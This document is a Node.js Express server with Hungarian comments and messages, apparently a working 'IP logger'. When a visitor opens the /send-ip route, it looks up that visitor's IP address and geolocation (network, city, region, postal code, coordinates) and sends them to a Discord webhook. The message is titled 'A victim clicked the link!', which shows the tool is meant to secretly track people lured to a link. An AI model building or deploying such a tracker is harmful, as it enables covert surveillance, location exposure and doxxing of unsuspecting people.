const express = require('express');
const axios = require('axios');
require('dotenv').config();
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Statikus fájlok
app.use(express.static(path.join(__dirname, 'public')));

// Webhook URL és IPINFO token a .env fájlból
const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
const ipinfoToken = process.env.IPINFO_TOKEN;

app.get('/send-ip', async (req, res) => {
    const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

    try {
        const geoResponse = await axios.get(`https://ipinfo.io/${userIp}?token=${ipinfoToken}`);
        const geoData = geoResponse.data;

        const [latitude, longitude] = (geoData.loc || '0,0').split(',');

        const message = {
            username: "Helyszíni Naplózó <3",
            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
            content: `<@1095731086513930260>`,
            embeds: [{
                title: "Egy áldozat rákattintott a linkre!",
                description: `**IP-cím >>** ${userIp}
**Hálózat >>** ${geoData.org || 'N/A'}
**Város >>** ${geoData.city || 'N/A'}
**Régió >>** ${geoData.region || 'N/A'}
**Ország >>** ${geoData.country || 'N/A'}
**Irányítószám >>** ${geoData.postal || 'N/A'}
**Szélesség >>** ${latitude}
**Hosszúság >>** ${longitude}`,
                color: 0x800080
            }]
        };

        await axios.post(webhookUrl, message);
        res.send('IP és helyadatok sikeresen elküldve Discordra!');
    } catch (error) {
        console.error('Hiba:', error.message);
        res.send('Nem sikerült az IP lekérdezés vagy Discord küldés.');
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
